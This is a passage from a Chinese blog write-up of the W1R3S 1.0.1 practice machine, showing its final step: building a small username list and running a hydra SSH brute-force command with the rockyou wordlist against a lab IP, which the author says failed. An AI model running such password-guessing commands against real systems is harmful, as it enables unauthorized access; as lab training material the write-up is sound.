+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072130619.png" alt="image-20240507213005562" data-caption="image-20240507213005562" loading="lazy"></p>
+<h1 id="9-hydra破解ssh"><a href="#9-hydra破解ssh" class="headerlink" title="9. hydra破解ssh"></a>9. hydra破解ssh</h1><p>一般不使用该方法,没什么技术含量可言</p>
+<p>创建字典</p>
+<blockquote>
+<p>vim user.list</p>
+<p>w1r3s</p>
+<p>admin</p>
+<p>root</p>
+</blockquote>
+<blockquote>
+<p>hydra -l user.list -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh:192.168.31.52 -t 4</p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072146373.png" alt="image-20240507214604323" data-caption="image-20240507214604323" loading="lazy"></p>
+<p>有博主破解出来了,反正我没破解出来,再见了,下机,反正不是什么实用的方法.</p>
+
+    <p><img data-fancybox="gallery" src="https://i.dawnlab.me/53a8c7cf3ad77a0f0a456ce2c6afe88a.png"  alt="53a8c7cf3ad77a0f0a456ce2c6afe88a.png" data-caption="53a8c7cf3ad77a0f0a456ce2c6afe88a.png" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>Candy<br>
+        <strong>本文链接：</strong><a href="http://example.com/2024/05/07/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/" title="http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;05&#x2F;07&#x2F;W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;05&#x2F;07&#x2F;W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+
+  
+      <div class="nexmoe-post-footer">
+          请在你的配置文件中设置评论框插槽
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">1. nmap扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-IP%E5%9C%B0%E5%9D%80%E7%A1%AE%E5%AE%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 IP地址确定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-ftp%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 ftp连接测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-hash-identifier%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">2. hash-identifier工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E8%A7%A3%E5%AF%86%E5%AF%86%E6%96%87"><span class="toc-number">3.</span> <span class="toc-text">3. 解密密文</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-3306%E7%AB%AF%E5%8F%A3sql%E6%B5%8B%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">4. 3306端口sql测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-gobuster%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">5.</span> <span class="toc-text">5. gobuster目录爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2"><span class="toc-number">6.</span> <span class="toc-text">6. 漏洞搜索</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE"><span class="toc-number">7.</span> <span class="toc-text">7. 浏览器发送数据</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-hash%E7%88%86%E7%A0%B4"><span class="toc-number">8.</span> <span class="toc-text">8. hash爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-hydra%E7%A0%B4%E8%A7%A3ssh"><span class="toc-number">9.</span> <span class="toc-text">9. hydra破解ssh</span></a></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script></div></body></html>
